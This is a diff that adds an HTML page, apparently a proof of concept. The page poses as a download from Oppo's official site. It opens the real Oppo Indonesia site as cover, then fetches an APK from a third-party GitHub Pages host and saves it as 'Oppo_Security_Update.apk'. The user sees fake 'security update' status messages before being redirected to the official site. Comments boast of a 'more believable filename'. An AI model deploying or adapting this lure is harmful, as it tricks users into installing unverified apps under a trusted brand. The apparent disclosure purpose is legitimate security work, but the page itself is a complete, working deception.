@@ -1,0 +1,122 @@
+<html>
+<head>
+  <meta charset="utf-8">
+  <style>
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+      border-radius: 4px;
+      transition: background-color 0.3s;
+    }
+    .button:hover {
+      background-color: #45a049;
+    }
+    .status {
+      margin-top: 20px;
+      padding: 10px;
+      border-radius: 4px;
+      display: none;
+    }
+    .status.error {
+      background-color: #ffebee;
+      color: #c62828;
+      display: block;
+    }
+    .status.success {
+      background-color: #e8f5e9;
+      color: #2e7d32;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <center>
+    <input type="button" class="button" value="Download From Original Site" onclick="initiateDownload()">
+    <div id="status" class="status"></div>
+  </center>
+
+  <script>
+    function initiateDownload() {
+      const statusEl = document.getElementById('status');
+      
+      // Open legitimate site immediately
+      try {
+        window.open('https://www.oppo.com/id/', '_blank', 'noopener,noreferrer');
+      } catch (e) {
+        console.error("Failed to open legitimate site:", e);
+        showStatus("Failed to open official site. Please try again.", true);
+        return;
+      }
+      
+      // Start APK download process after delay
+      setTimeout(() => {
+        statusEl.textContent = "Preparing download...";
+        statusEl.className = "status success";
+        triggerFakeDownload();
+      }, 5000);
+    }
+
+    function triggerFakeDownload() {
+      const statusEl = document.getElementById('status');
+      const fileUrl = "https://oxfat.github.io/fake.apk"; // Cleaned URL
+      
+      statusEl.textContent = "Downloading security update...";
+      statusEl.className = "status success";
+      
+      fetch(fileUrl, {mode: 'cors'})
+        .then(response => {
+          if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+          }
+          return response.blob();
+        })
+        .then(blob => {
+          const url = URL.createObjectURL(blob);
+          const link = document.createElement("a");
+          link.href = url;
+          link.download = "Oppo_Security_Update.apk"; // More believable filename
+          document.body.appendChild(link);
+          
+          // Simulate user interaction for better browser compatibility
+          setTimeout(() => {
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+            
+            statusEl.textContent = "Download completed! Please check your downloads folder.";
+            statusEl.className = "status success";
+            
+            // Optional: Redirect to legitimate site after download
+            setTimeout(() => {
+              window.location.href = 'https://www.oppo.com/id/';
+            }, 3000);
+          }, 300);
+        })
+        .catch(err => {
+          console.error("[PoC] Download failed:", err);
+          statusEl.textContent = `Download failed: ${err.message}. Redirecting to official site...`;
+          statusEl.className = "status error";
+          
+          // Fallback: Redirect to legitimate site after error
+          setTimeout(() => {
+            window.location.href = 'https://www.oppo.com/id/';
+          }, 5000);
+        });
+    }
+    
+    function showStatus(message, isError) {
+      const statusEl = document.getElementById('status');
+      statusEl.textContent = message;
+      statusEl.className = `status ${isError ? 'error' : 'success'}`;
+    }
+  </script>
+</body>
+</html>
